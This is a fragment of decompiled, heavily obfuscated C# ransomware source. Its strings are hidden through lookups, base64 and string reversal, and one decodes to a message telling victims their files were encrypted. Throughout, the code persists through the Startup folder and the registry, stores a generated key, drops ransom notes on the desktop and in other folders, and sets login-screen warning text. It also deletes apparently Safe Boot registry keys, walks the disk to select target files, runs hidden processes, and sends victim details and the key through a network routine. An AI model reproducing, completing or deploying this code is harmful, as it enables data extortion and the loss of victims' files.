						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396400))
						{
							SidumIOOlYmWUm = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396423))
						{
							SidumIOOlYmWUm = true;
						}
					}
					if (text3.Contains(getString_0(107396392)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396400))
						{
							SWaMdrdKGgzowGl = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396423))
						{
							SWaMdrdKGgzowGl = false;
						}
					}
					if (text3.Contains(getString_0(107396347)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396400))
						{
							uBpdQdBJjeZ = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396423))
						{
							uBpdQdBJjeZ = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107396318) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (ZQLLErbedcYeoR == getString_0(107396382))
		{
			fPtHdQkHcrBBhs();
		}
		if (DBkpQAKkEJYsTWP)
		{
			try
			{
				Console.WriteLine(getString_0(107396273));
				YDkRxPhecOsK.GNLGHYwRKCAcg();
			}
			catch (Exception ex8)
			{
				if (SWaMdrdKGgzowGl)
				{
					try
					{
						File.AppendAllText(bDDJFCkjBbYQ, getString_0(107396220) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ZuXmDgobJnjb)
			{
				try
				{
					Thread thread4 = new Thread(LnsjXPzikShT.tWDdAuebayUkASdwh);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			HnVlWPPowq(getString_0(107396719), sNXkawcfFmeqKOWI(getString_0(107396706)));
		}
		SecureString secureString = new SecureString();
		if (IjKkEPdMxTo == getString_0(107396382))
		{
			OxsDDfqLEi = WQPkeOvEci.SBPfmWOaNeINeU(32);
			lXgIUpLgAi = WQPkeOvEci.JZQcnaocigGbMUm();
		}
		else
		{
			OxsDDfqLEi = getString_0(107396601);
		}
		GThDVKInjH = pEVoDrneEBXda.qxtPYzjMemryI(OxsDDfqLEi + lXgIUpLgAi);
		if (!UpNccIaFzBadyA)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(sNXkawcfFmeqKOWI(getString_0(107396588)));
				if (registryKey != null)
				{
					registryKey.SetValue(sNXkawcfFmeqKOWI(getString_0(107396511)) + (registryKey.ValueCount + 1), GThDVKInjH);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(sNXkawcfFmeqKOWI(getString_0(107396588)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(sNXkawcfFmeqKOWI(getString_0(107396511)) + (registryKey2.ValueCount + 1), GThDVKInjH);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (TLvIKeJnVejcNG == getString_0(107396816))
		{
			kvvPzGZZdOrFQk();
		}
		if (jnImjWIMcpl)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD), string.Concat(sNXkawcfFmeqKOWI(getString_0(107396502)), new WebClient().DownloadString(sNXkawcfFmeqKOWI(getString_0(107396477))), getString_0(107395924), sNXkawcfFmeqKOWI(getString_0(107395951)), DateTime.Now, getString_0(107395924), sNXkawcfFmeqKOWI(getString_0(107395910)), GThDVKInjH));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD), getString_0(107395853) + GThDVKInjH);
				}
			}
			catch (Exception ex13)
			{
				if (SWaMdrdKGgzowGl)
				{
					try
					{
						File.AppendAllText(bDDJFCkjBbYQ, getString_0(107395792) + ex13.Message + getString_0(107395924));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		PFJsuRtmKELhNI.DQSNSZueuFrrI(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ZLERFztvScvXGTf), qZWFzbdOHe(GThDVKInjH), null, null, getString_0(107395743), getString_0(107395758), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			vNDEZKKFshE();
		}
		try
		{
			try
			{
				if (SidumIOOlYmWUm)
				{
					Console.WriteLine(getString_0(107395709));
				}
			}
			catch
			{
			}
			RSvelGjmuPihIw(new string[1] { getString_0(107396204) }, new string[100]
			{
				getString_0(107396195),
				getString_0(107396158),
				getString_0(107396153),
				getString_0(107396144),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396161),
				getString_0(107396124),
				getString_0(107396119),
				getString_0(107396114),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396095),
				getString_0(107396090),
				getString_0(107396081),
				getString_0(107396108),
				getString_0(107396103),
				getString_0(107396098),
				getString_0(107396061),
				getString_0(107396056),
				getString_0(107396079),
				getString_0(107396074),
				getString_0(107396069),
				getString_0(107396064),
				getString_0(107396027),
				getString_0(107396022),
				getString_0(107396017),
				getString_0(107396044),
				getString_0(107396039),
				getString_0(107396034),
				getString_0(107395997),
				getString_0(107395992),
				getString_0(107395987),
				getString_0(107396014),
				getString_0(107396005),
				getString_0(107396000),
				getString_0(107395963),
				getString_0(107395958),
				getString_0(107396161),
				getString_0(107395953),
				getString_0(107396119),
				getString_0(107395976),
				getString_0(107395971),
				getString_0(107395422),
				getString_0(107395417),
				getString_0(107395412),
				getString_0(107395439),
				getString_0(107395434),
				getString_0(107395429),
				getString_0(107395424),
				getString_0(107395387),
				getString_0(107395382),
				getString_0(107395377),
				getString_0(107395404),
				getString_0(107395399),
				getString_0(107395394),
				getString_0(107395357),
				getString_0(107395352),
				getString_0(107395375),
				getString_0(107395370),
				getString_0(107395361),
				getString_0(107395316),
				getString_0(107395953),
				getString_0(107395335),
				getString_0(107395294),
				getString_0(107395285),
				getString_0(107395308),
				getString_0(107395299),
				getString_0(107395258),
				getString_0(107395253),
				getString_0(107395276),
				getString_0(107395267),
				getString_0(107395226),
				getString_0(107395221),
				getString_0(107395216),
				getString_0(107395243),
				getString_0(107395238),
				getString_0(107395233),
				getString_0(107395196),
				getString_0(107395187),
				getString_0(107395214),
				getString_0(107395209),
				getString_0(107395204),
				getString_0(107395679),
				getString_0(107395674),
				getString_0(107395665),
				getString_0(107395688),
				getString_0(107395683),
				getString_0(107395987),
				getString_0(107395646),
				getString_0(107395641),
				getString_0(107395636),
				getString_0(107395663),
				getString_0(107395658),
				getString_0(107395649),
				getString_0(107395612),
				getString_0(107395607),
				getString_0(107395630),
				getString_0(107395625),
				getString_0(107395620)
			}, new string[0], OxsDDfqLEi, getString_0(107395583));
		}
		catch (Exception ex15)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107395598) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541));
				streamWriter.WriteLine(sNXkawcfFmeqKOWI(getString_0(107395508)));
				streamWriter.WriteLine(getString_0(107395924));
				streamWriter.WriteLine(sNXkawcfFmeqKOWI(getString_0(107389754)));
				streamWriter.WriteLine(GThDVKInjH);
				if (gsXyoeFOorGZ == getString_0(107396382))
				{
					streamWriter.WriteLine(getString_0(107395924));
					streamWriter.WriteLine(sNXkawcfFmeqKOWI(getString_0(107389721)) + Convert.ToString(JEkdiihxCoWf.Count));
				}
				if (OtvlrYHFRq)
				{
					streamWriter.WriteLine(getString_0(107395924));
					streamWriter.WriteLine(sNXkawcfFmeqKOWI(getString_0(107389676)));
					streamWriter.WriteLine(aDJKTHVvtfISh.qRWwyoluwsX());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541));
				if (!text11.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541), getString_0(107389643) + GThDVKInjH);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in IDUZlSGaIfn)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395541)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541), item + getString_0(107395541), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541));
					if (!text12.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
					{
						File.AppendAllText(item + getString_0(107395541), getString_0(107389643) + GThDVKInjH);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!XeXEhFhfYVvh && num > 10)
			{
				break;
			}
		}
		if (lanIsMFtITLe == getString_0(107396816))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389614)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389614));
					streamWriter2.WriteLine(sNXkawcfFmeqKOWI(getString_0(107389581)));
					streamWriter2.WriteLine(getString_0(107395924));
					streamWriter2.WriteLine(sNXkawcfFmeqKOWI(getString_0(107402097)));
					streamWriter2.WriteLine(GThDVKInjH + sNXkawcfFmeqKOWI(getString_0(107401496)));
					if (gsXyoeFOorGZ == getString_0(107396382))
					{
						streamWriter2.WriteLine(getString_0(107395924));
						streamWriter2.WriteLine(sNXkawcfFmeqKOWI(getString_0(107401515)) + sNXkawcfFmeqKOWI(getString_0(107389721)) + Convert.ToString(JEkdiihxCoWf.Count) + sNXkawcfFmeqKOWI(getString_0(107401496)));
					}
					if (OtvlrYHFRq)
					{
						streamWriter2.WriteLine(getString_0(107395924));
						streamWriter2.WriteLine(sNXkawcfFmeqKOWI(getString_0(107389676)));
						streamWriter2.WriteLine(aDJKTHVvtfISh.qRWwyoluwsX());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541));
					if (!text13.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389614), sNXkawcfFmeqKOWI(getString_0(107401515)) + getString_0(107389643) + GThDVKInjH + sNXkawcfFmeqKOWI(getString_0(107401496)));
					}
				}
			}
			catch
			{
			}
		}
		if (HohHoEgJewvBWz == getString_0(107396816))
		{
			try
			{
				if (gsXyoeFOorGZ == getString_0(107396382))
				{
					aDJKTHVvtfISh.hknyQTQpXdeCtPb(getString_0(107401454), getString_0(107401449), getString_0(107401404), string.Concat(sNXkawcfFmeqKOWI(getString_0(107396502)), new WebClient().DownloadString(sNXkawcfFmeqKOWI(getString_0(107396477))), getString_0(107401395), sNXkawcfFmeqKOWI(getString_0(107395951)), DateTime.Now, getString_0(107395924), sNXkawcfFmeqKOWI(getString_0(107401422)), Convert.ToString(JEkdiihxCoWf.Count), getString_0(107395924), sNXkawcfFmeqKOWI(getString_0(107395910)), GThDVKInjH));
				}
				else
				{
					aDJKTHVvtfISh.hknyQTQpXdeCtPb(getString_0(107401454), getString_0(107401449), getString_0(107401404), string.Concat(sNXkawcfFmeqKOWI(getString_0(107396502)), new WebClient().DownloadString(sNXkawcfFmeqKOWI(getString_0(107396477))), getString_0(107401395), sNXkawcfFmeqKOWI(getString_0(107395951)), DateTime.Now, getString_0(107395924), sNXkawcfFmeqKOWI(getString_0(107401422)), Convert.ToString(JEkdiihxCoWf.Count), getString_0(107395924), sNXkawcfFmeqKOWI(getString_0(107395910)), GThDVKInjH));
				}
			}
			catch
			{
			}
		}
		if (DdPuPlUptL == getString_0(107396816))
		{
			try
			{
				efqfSdomRf.aXdcewTQwxw(new Uri(getString_0(107401341)));
			}
			catch
			{
			}
		}
		if (lanIsMFtITLe == getString_0(107396382))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541)))
				{
					Process.Start(sNXkawcfFmeqKOWI(getString_0(107401340)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395541));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389614)))
				{
					Process.Start(sNXkawcfFmeqKOWI(getString_0(107401347)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389614));
				}
			}
			catch
			{
			}
		}
		if (TLvIKeJnVejcNG == getString_0(107396816))
		{
			if (cfLMhLbiCC == getString_0(107396816) && !string.IsNullOrEmpty(dPIYrIPkEeCv) && !string.IsNullOrEmpty(LfrLWEkFCBwUa))
			{
				GOCHRbHpNvTrX(dPIYrIPkEeCv, LfrLWEkFCBwUa);
			}
			else
			{
				GOCHRbHpNvTrX(getString_0(107401810), getString_0(107401781));
			}
		}
		if (EMMMLIMedETY != getString_0(107401067))
		{
			awkVoljQenG(EMMMLIMedETY);
		}
		if (!string.IsNullOrEmpty(YrUNJYkfZORc))
		{
			try
			{
				File.Delete(YrUNJYkfZORc);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(bDDJFCkjBbYQ, getString_0(107401018) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (SWaMdrdKGgzowGl)
		{
			try
			{
				File.AppendAllText(bDDJFCkjBbYQ, getString_0(107401005));
			}
			catch (Exception)
			{
			}
		}
		if (mkgreXsNDfWo == getString_0(107400992))
		{
			nowMmKZNVgcmM();
		}
	}

	public static void rOtiAFqspWPBRghE()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(sNXkawcfFmeqKOWI(getString_0(107400951)), sNXkawcfFmeqKOWI(getString_0(107401810)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int vEzbOdrkUR(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> lmvggGXyiRUOYf(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107401309)) && !text.Contains(getString_0(107401316)) && !text.Contains(getString_0(107401283)) && !text.ToLower().Contains(getString_0(107401234)) && !text.ToLower().Contains(getString_0(107401253)) && !text.Contains(getString_0(107401228)) && !text.Contains(getString_0(107401175)) && !text.ToLower().Contains(getString_0(107401194)) && !text.ToLower().Contains(getString_0(107401149)) && !text.ToLower().Contains(getString_0(107401112)) && !text.ToLower().Contains(getString_0(107401135)) && !text.ToLower().Contains(getString_0(107401086)) && !text.ToLower().Contains(getString_0(107401073)) && !text.ToLower().Contains(getString_0(107401092)) && !text.ToLower().Contains(getString_0(107400559)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107400502)) && !fileInfo.FullName.Contains(getString_0(107400517)) && !fileInfo.FullName.Contains(getString_0(107400468)) && !fileInfo.FullName.Contains(getString_0(107400483)) && !fileInfo.FullName.Contains(getString_0(107400434)) && !fileInfo.FullName.Contains(getString_0(107400449)) && !fileInfo.FullName.Contains(getString_0(107400400)) && !fileInfo.FullName.Contains(getString_0(107400383)) && !fileInfo.FullName.Contains(getString_0(107400370)) && !fileInfo.FullName.Contains(getString_0(107400349)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400336)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400355)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400306)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400321)) && !fileInfo.FullName.Contains(sNXkawcfFmeqKOWI(getString_0(107400784))) && !fileInfo.FullName.Contains(getString_0(107400759)) && !fileInfo.FullName.Contains(getString_0(107397066)) && !fileInfo.FullName.Contains(getString_0(107400778)) && !fileInfo.FullName.EndsWith(getString_0(107395583)) && !fileInfo.FullName.EndsWith(getString_0(107400721)) && !fileInfo.FullName.EndsWith(getString_0(107400748)) && !fileInfo.FullName.EndsWith(getString_0(107400743)) && !fileInfo.FullName.EndsWith(getString_0(107400738)) && !fileInfo.FullName.Contains(getString_0(107400701)) && !fileInfo.FullName.Contains(ZLERFztvScvXGTf) && !fileInfo.FullName.Contains(bDDJFCkjBbYQ) && !fileInfo.FullName.Contains(IKRtRLOSqagD))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(FoLsSeMcEVuV) * 1024.0 * 1024.0 && QotWPeyjvzjx == getString_0(107396816))
						{
							list.Add(fileInfo.FullName);
							iXUGRicpNdnw(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && QotWPeyjvzjx == getString_0(107396382))
						{
							list.Add(fileInfo.FullName);
							iXUGRicpNdnw(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void fPtHdQkHcrBBhs()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400716));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!eaZULefnOUcJVI.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400631), getString_0(107396738)).Replace(getString_0(107400626), getString_0(107400631))
					.Replace(getString_0(107400649), getString_0(107401341))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					eaZULefnOUcJVI.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400631), getString_0(107396738)).Replace(getString_0(107400626), getString_0(107400631))
						.Replace(getString_0(107400649), getString_0(107401341))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400644), getString_0(107401341)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string HnVlWPPowq(string fbwWjGZmoltSa = "", string GfsLDGmbSdxOwTz = "")
	{
		string result = getString_0(107401341);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = fbwWjGZmoltSa,
				Arguments = GfsLDGmbSdxOwTz,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void RdYwqXqmYPnb(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107400603),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string UIqHgaUGjSA(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string sNXkawcfFmeqKOWI(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void IMVtTRKCTbnt(string BMChImvOcWRCc = "", string fuuwxPaKOrBW = "SW5mb3JtYXRpb24uLi4=", string RJtcmpjnyYLTE = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		BMChImvOcWRCc = UIqHgaUGjSA(getString_0(107400618));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(sNXkawcfFmeqKOWI(BMChImvOcWRCc), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(sNXkawcfFmeqKOWI(getString_0(107400009)), sNXkawcfFmeqKOWI(fuuwxPaKOrBW));
				registryKey.SetValue(sNXkawcfFmeqKOWI(getString_0(107399976)), sNXkawcfFmeqKOWI(RJtcmpjnyYLTE));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			BMChImvOcWRCc = UIqHgaUGjSA(getString_0(107399947));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(sNXkawcfFmeqKOWI(BMChImvOcWRCc), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(sNXkawcfFmeqKOWI(getString_0(107399842)), sNXkawcfFmeqKOWI(fuuwxPaKOrBW));
				registryKey.SetValue(sNXkawcfFmeqKOWI(getString_0(107399809)), sNXkawcfFmeqKOWI(RJtcmpjnyYLTE));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void kvvPzGZZdOrFQk()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (cfLMhLbiCC == getString_0(107396816) && !string.IsNullOrEmpty(dPIYrIPkEeCv) && !string.IsNullOrEmpty(LfrLWEkFCBwUa))
				{
					IMVtTRKCTbnt(getString_0(107401341), dPIYrIPkEeCv, LfrLWEkFCBwUa);
				}
				else
				{
					IMVtTRKCTbnt(getString_0(107401341), getString_0(107401810), getString_0(107401781));
				}
			}
		}
		catch
		{
		}
	}

	public static void GOCHRbHpNvTrX(string sBSjunaOCSQWpxv = "SW5mb3JtYXRpb24uLi4=", string BlmdhmaGXOO = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(sNXkawcfFmeqKOWI(sBSjunaOCSQWpxv));
		val.set_BalloonTipText(sNXkawcfFmeqKOWI(BlmdhmaGXOO));
		val.ShowBalloonTip(30000);
	}

	public static void awkVoljQenG(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107400292)), getString_0(107400243) + text + getString_0(107400266) + string_0);
	}

	public static void fBleBDBVVYJJ(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = sNXkawcfFmeqKOWI(getString_0(107400261));
		processStartInfo.Arguments = getString_0(107400232) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool FZyglfulTLXH(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool WHWgOONtIDcZxId(string string_0)
	{
		try
		{
			ckfPtqCGdlNQCoO CS_0024_003C_003E8__locals0 = new ckfPtqCGdlNQCoO();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.RSMlmXfaxX = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.RSMlmXfaxX);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107400227);
		}
		catch
		{
			return false;
		}
	}

	public static void lhyglJDROXnz()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = UIqHgaUGjSA(getString_0(107400186));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(sNXkawcfFmeqKOWI(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107400048)));
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107399511)));
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107399526)));
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107399501)));
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107400261)));
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107399444)));
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107400292)));
					registryKey.Close();
				}
				string_ = UIqHgaUGjSA(getString_0(107399415));
				registryKey = Registry.LocalMachine.OpenSubKey(sNXkawcfFmeqKOWI(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107399318)));
					registryKey.Close();
				}
				string_ = UIqHgaUGjSA(getString_0(107399333));
				registryKey = Registry.LocalMachine.OpenSubKey(sNXkawcfFmeqKOWI(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107399318)));
					registryKey.Close();
				}
				string_ = UIqHgaUGjSA(getString_0(107399333));
				registryKey = Registry.CurrentUser.OpenSubKey(sNXkawcfFmeqKOWI(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(sNXkawcfFmeqKOWI(getString_0(107399318)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107399284)), sNXkawcfFmeqKOWI(getString_0(107399299)));
			HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107399730)), sNXkawcfFmeqKOWI(UIqHgaUGjSA(getString_0(107399753))));
			HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107399730)), sNXkawcfFmeqKOWI(getString_0(107399575)));
			HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107399002)), sNXkawcfFmeqKOWI(getString_0(107399017)));
		}
		catch
		{
		}
	}

	public static void VbClOPiwZbe(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(sNXkawcfFmeqKOWI(getString_0(107398944)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
